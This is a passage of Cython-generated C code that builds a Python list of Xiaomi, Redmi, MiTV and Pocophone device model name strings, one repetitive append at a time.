  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 23, __pyx_kp_s_Mi_CC_9e)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Mi_CC9);
  __Pyx_GIVEREF(__pyx_kp_s_Mi_CC9);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 24, __pyx_kp_s_Mi_CC9)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Mi_Laser_Projector_150);
  __Pyx_GIVEREF(__pyx_kp_s_Mi_Laser_Projector_150);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 25, __pyx_kp_s_Mi_Laser_Projector_150)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Mi_Max);
  __Pyx_GIVEREF(__pyx_kp_s_Mi_Max);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 26, __pyx_kp_s_Mi_Max)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Mi_Max_2);
  __Pyx_GIVEREF(__pyx_kp_s_Mi_Max_2);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 27, __pyx_kp_s_Mi_Max_2)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Mi_Max_3);
  __Pyx_GIVEREF(__pyx_kp_s_Mi_Max_3);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 28, __pyx_kp_s_Mi_Max_3)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Mi_MAX2);
  __Pyx_GIVEREF(__pyx_kp_s_Mi_MAX2);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 29, __pyx_kp_s_Mi_MAX2)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Mi_Max3);
  __Pyx_GIVEREF(__pyx_kp_s_Mi_Max3);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 30, __pyx_kp_s_Mi_Max3)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Mi_Mix);
  __Pyx_GIVEREF(__pyx_kp_s_Mi_Mix);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 31, __pyx_kp_s_Mi_Mix)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Mi_Mix_2);
  __Pyx_GIVEREF(__pyx_kp_s_Mi_Mix_2);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 32, __pyx_kp_s_Mi_Mix_2)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Mi_Mix_2S);
  __Pyx_GIVEREF(__pyx_kp_s_Mi_Mix_2S);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 33, __pyx_kp_s_Mi_Mix_2S)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Mi_Mix_3);
  __Pyx_GIVEREF(__pyx_kp_s_Mi_Mix_3);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 34, __pyx_kp_s_Mi_Mix_3)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Mi_Mix_3_5G);
  __Pyx_GIVEREF(__pyx_kp_s_Mi_Mix_3_5G);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 35, __pyx_kp_s_Mi_Mix_3_5G)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Mi_Mix_4);
  __Pyx_GIVEREF(__pyx_kp_s_Mi_Mix_4);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 36, __pyx_kp_s_Mi_Mix_4)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Mi_Mix_Fold);
  __Pyx_GIVEREF(__pyx_kp_s_Mi_Mix_Fold);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 37, __pyx_kp_s_Mi_Mix_Fold)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Mi_Note_10);
  __Pyx_GIVEREF(__pyx_kp_s_Mi_Note_10);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 38, __pyx_kp_s_Mi_Note_10)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Mi_Note_10_Lite);
  __Pyx_GIVEREF(__pyx_kp_s_Mi_Note_10_Lite);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 39, __pyx_kp_s_Mi_Note_10_Lite)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Mi_Note_10_Pro);
  __Pyx_GIVEREF(__pyx_kp_s_Mi_Note_10_Pro);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 40, __pyx_kp_s_Mi_Note_10_Pro)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Mi_Note_11);
  __Pyx_GIVEREF(__pyx_kp_s_Mi_Note_11);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 41, __pyx_kp_s_Mi_Note_11)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Mi_Note_2);
  __Pyx_GIVEREF(__pyx_kp_s_Mi_Note_2);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 42, __pyx_kp_s_Mi_Note_2)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Mi_Note_3);
  __Pyx_GIVEREF(__pyx_kp_s_Mi_Note_3);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 43, __pyx_kp_s_Mi_Note_3)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Mi_Note_8);
  __Pyx_GIVEREF(__pyx_kp_s_Mi_Note_8);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 44, __pyx_kp_s_Mi_Note_8)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Mi_Note_LTE);
  __Pyx_GIVEREF(__pyx_kp_s_Mi_Note_LTE);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 45, __pyx_kp_s_Mi_Note_LTE)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Mi_Note_Pro);
  __Pyx_GIVEREF(__pyx_kp_s_Mi_Note_Pro);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 46, __pyx_kp_s_Mi_Note_Pro)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Mi_Note10);
  __Pyx_GIVEREF(__pyx_kp_s_Mi_Note10);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 47, __pyx_kp_s_Mi_Note10)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Mi_Note5);
  __Pyx_GIVEREF(__pyx_kp_s_Mi_Note5);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 48, __pyx_kp_s_Mi_Note5)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Mi_One);
  __Pyx_GIVEREF(__pyx_kp_s_Mi_One);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 49, __pyx_kp_s_Mi_One)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Mi_One_C1);
  __Pyx_GIVEREF(__pyx_kp_s_Mi_One_C1);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 50, __pyx_kp_s_Mi_One_C1)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Mi_One_Plus);
  __Pyx_GIVEREF(__pyx_kp_s_Mi_One_Plus);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 51, __pyx_kp_s_Mi_One_Plus)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Mi_Pad);
  __Pyx_GIVEREF(__pyx_kp_s_Mi_Pad);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 52, __pyx_kp_s_Mi_Pad)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Mi_Pad_2);
  __Pyx_GIVEREF(__pyx_kp_s_Mi_Pad_2);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 53, __pyx_kp_s_Mi_Pad_2)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Mi_Pad_3);
  __Pyx_GIVEREF(__pyx_kp_s_Mi_Pad_3);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 54, __pyx_kp_s_Mi_Pad_3)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Mi_Pad_4);
  __Pyx_GIVEREF(__pyx_kp_s_Mi_Pad_4);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 55, __pyx_kp_s_Mi_Pad_4)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Mi_Pad_4_Plus);
  __Pyx_GIVEREF(__pyx_kp_s_Mi_Pad_4_Plus);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 56, __pyx_kp_s_Mi_Pad_4_Plus)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Mi_Pad_5);
  __Pyx_GIVEREF(__pyx_kp_s_Mi_Pad_5);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 57, __pyx_kp_s_Mi_Pad_5)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Mi_Pad_5_Pro);
  __Pyx_GIVEREF(__pyx_kp_s_Mi_Pad_5_Pro);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 58, __pyx_kp_s_Mi_Pad_5_Pro)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Mi_Pad_5_Pro_5G);
  __Pyx_GIVEREF(__pyx_kp_s_Mi_Pad_5_Pro_5G);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 59, __pyx_kp_s_Mi_Pad_5_Pro_5G)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Mi_Pad4);
  __Pyx_GIVEREF(__pyx_kp_s_Mi_Pad4);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 60, __pyx_kp_s_Mi_Pad4)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Mi_Pad5);
  __Pyx_GIVEREF(__pyx_kp_s_Mi_Pad5);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 61, __pyx_kp_s_Mi_Pad5)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Mi_Play);
  __Pyx_GIVEREF(__pyx_kp_s_Mi_Play);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 62, __pyx_kp_s_Mi_Play)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Mi_XL);
  __Pyx_GIVEREF(__pyx_kp_s_Mi_XL);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 63, __pyx_kp_s_Mi_XL)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_Mi5);
  __Pyx_GIVEREF(__pyx_n_s_Mi5);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 64, __pyx_n_s_Mi5)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_MiTV_4A);
  __Pyx_GIVEREF(__pyx_kp_s_MiTV_4A);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 65, __pyx_kp_s_MiTV_4A)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_MiTV_4A_Pro);
  __Pyx_GIVEREF(__pyx_kp_s_MiTV_4A_Pro);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 66, __pyx_kp_s_MiTV_4A_Pro)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_MiTV_4C);
  __Pyx_GIVEREF(__pyx_kp_s_MiTV_4C);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 67, __pyx_kp_s_MiTV_4C)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_MiTV_4I);
  __Pyx_GIVEREF(__pyx_kp_s_MiTV_4I);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 68, __pyx_kp_s_MiTV_4I)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_MiTV_4S);
  __Pyx_GIVEREF(__pyx_kp_s_MiTV_4S);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 69, __pyx_kp_s_MiTV_4S)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_MiTV_4X);
  __Pyx_GIVEREF(__pyx_kp_s_MiTV_4X);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 70, __pyx_kp_s_MiTV_4X)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_MiTV_P1);
  __Pyx_GIVEREF(__pyx_kp_s_MiTV_P1);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 71, __pyx_kp_s_MiTV_P1)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_MiTV_Q1);
  __Pyx_GIVEREF(__pyx_kp_s_MiTV_Q1);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 72, __pyx_kp_s_MiTV_Q1)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_MiTV_Stick);
  __Pyx_GIVEREF(__pyx_kp_s_MiTV_Stick);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 73, __pyx_kp_s_MiTV_Stick)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_MiTV_Stick_4K);
  __Pyx_GIVEREF(__pyx_kp_s_MiTV_Stick_4K);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 74, __pyx_kp_s_MiTV_Stick_4K)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Mix_Fold_2);
  __Pyx_GIVEREF(__pyx_kp_s_Mix_Fold_2);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 75, __pyx_kp_s_Mix_Fold_2)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_MT6765_G_Series);
  __Pyx_GIVEREF(__pyx_kp_s_MT6765_G_Series);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 76, __pyx_kp_s_MT6765_G_Series)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Note_12_Pro);
  __Pyx_GIVEREF(__pyx_kp_s_Note_12_Pro);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 77, __pyx_kp_s_Note_12_Pro)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Pad_6_Pro);
  __Pyx_GIVEREF(__pyx_kp_s_Pad_6_Pro);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 78, __pyx_kp_s_Pad_6_Pro)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Pocophone_F1);
  __Pyx_GIVEREF(__pyx_kp_s_Pocophone_F1);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 79, __pyx_kp_s_Pocophone_F1)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Qin_1s);
  __Pyx_GIVEREF(__pyx_kp_s_Qin_1s);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 80, __pyx_kp_s_Qin_1s)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Qin_2);
  __Pyx_GIVEREF(__pyx_kp_s_Qin_2);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 81, __pyx_kp_s_Qin_2)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Qin_2_Pro);
  __Pyx_GIVEREF(__pyx_kp_s_Qin_2_Pro);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 82, __pyx_kp_s_Qin_2_Pro)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_11);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_11);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 83, __pyx_kp_s_Redmi_11)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_12);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_12);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 84, __pyx_kp_s_Redmi_12)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_2);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_2);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 85, __pyx_kp_s_Redmi_2)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_3);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_3);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 86, __pyx_kp_s_Redmi_3)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_4);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_4);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 87, __pyx_kp_s_Redmi_4)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_5);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_5);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 88, __pyx_kp_s_Redmi_5)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_6);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_6);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 89, __pyx_kp_s_Redmi_6)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_7);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_7);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 90, __pyx_kp_s_Redmi_7)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_8);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_8);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 91, __pyx_kp_s_Redmi_8)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_9);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_9);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 92, __pyx_kp_s_Redmi_9)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_A1);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_A1);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 93, __pyx_kp_s_Redmi_A1)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_A2);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_A2);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 94, __pyx_kp_s_Redmi_A2)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_A3);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_A3);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 95, __pyx_kp_s_Redmi_A3)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_K30);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_K30);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 96, __pyx_kp_s_Redmi_K30)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_K40);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_K40);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 97, __pyx_kp_s_Redmi_K40)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_K50);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_K50);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 98, __pyx_kp_s_Redmi_K50)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_K60);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_K60);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 99, __pyx_kp_s_Redmi_K60)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_note);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_note);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 100, __pyx_kp_s_Redmi_note)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_Note_1);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_Note_1);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 101, __pyx_kp_s_Redmi_Note_1)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_Note_10Redmi_Note_11);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_Note_10Redmi_Note_11);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 102, __pyx_kp_s_Redmi_Note_10Redmi_Note_11)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_Note_12);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_Note_12);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 103, __pyx_kp_s_Redmi_Note_12)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_Note_12T);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_Note_12T);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 104, __pyx_kp_s_Redmi_Note_12T)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_Note_13);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_Note_13);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 105, __pyx_kp_s_Redmi_Note_13)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_Note_15_Pro);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_Note_15_Pro);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 106, __pyx_kp_s_Redmi_Note_15_Pro)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_Note_2);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_Note_2);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 107, __pyx_kp_s_Redmi_Note_2)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_Note_3);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_Note_3);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 108, __pyx_kp_s_Redmi_Note_3)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_Note_4);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_Note_4);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 109, __pyx_kp_s_Redmi_Note_4)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_Note_5);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_Note_5);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 110, __pyx_kp_s_Redmi_Note_5)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_Note_5_Pro);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_Note_5_Pro);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 111, __pyx_kp_s_Redmi_Note_5_Pro)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_Note_6);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_Note_6);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 112, __pyx_kp_s_Redmi_Note_6)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_Note_7);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_Note_7);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 113, __pyx_kp_s_Redmi_Note_7)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_Note_7_Pro);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_Note_7_Pro);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 114, __pyx_kp_s_Redmi_Note_7_Pro)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_Note_8_Pro);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_Note_8_Pro);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 115, __pyx_kp_s_Redmi_Note_8_Pro)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_Note_8T);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_Note_8T);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 116, __pyx_kp_s_Redmi_Note_8T)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_Note_9);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_Note_9);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 117, __pyx_kp_s_Redmi_Note_9)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_Note_9_5G);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_Note_9_5G);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 118, __pyx_kp_s_Redmi_Note_9_5G)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_Note_9_Pro);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_Note_9_Pro);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 119, __pyx_kp_s_Redmi_Note_9_Pro)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_Note_9_Pro_5G);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_Note_9_Pro_5G);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 120, __pyx_kp_s_Redmi_Note_9_Pro_5G)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_Note_9_Pro_Max);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_Note_9_Pro_Max);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 121, __pyx_kp_s_Redmi_Note_9_Pro_Max)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_Note_9S);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_Note_9S);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 122, __pyx_kp_s_Redmi_Note_9S)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_Note_9T);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_Note_9T);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 123, __pyx_kp_s_Redmi_Note_9T)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_Note_9T_5G);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_Note_9T_5G);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 124, __pyx_kp_s_Redmi_Note_9T_5G)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_Note_Prime);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_Note_Prime);
